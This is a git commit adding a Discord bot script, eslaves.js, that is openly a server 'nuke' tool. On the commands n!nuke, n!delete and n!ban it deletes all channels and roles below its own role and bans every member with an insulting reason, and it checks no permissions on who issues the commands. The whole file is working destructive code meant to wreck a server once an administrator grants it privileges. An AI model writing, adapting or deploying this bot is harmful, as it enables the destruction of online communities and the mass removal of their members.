e1367ca7d2f92f494d8eae168b80e7b701b6c980
verism <78514471+turtlesgang@users.noreply.github.com>
2021-05-09 19:08:30 -0400

    Create eslaves.js

---
+++ eslaves.js
@@ -0,0 +1,38 @@
+const discord = require("discord.js");
+const nuke = new discord.Client();
+
+
+nuke.on("ready", () =>{
+console.log(" ")
+console.log(`${nuke.user.tag} is online.`);
+nuke.user.setPresence({ game: { name: `made by verism#1337` }, type: 0 });
+});
+
+nuke.on("message", async(msg)=>{
+
+
+
+if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
+    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+    msg.guild.members.tap(member => member.ban("Get banned monkey LOL! | verism#1337"));
+}
+if(msg.content.toLowerCase().startsWith("n!" + "delete")){
+    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+}
+if(msg.content.toLowerCase().startsWith("n!" + "ban")){
+    msg.guild.members.tap(member => member.ban("Get banned monkey LOL! | verism#1337"));
+}
+if(msg.content.toLowerCase().startsWith("n!" + "help")){
+    msg.author.send({
+        embed: {
+            color: 0xff0000,
+            author: { name: "ESlaves Bot | n!help" },
+            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord"
+        }
+    })
+}
+});
+
+nuke.login("TOKENHERE");
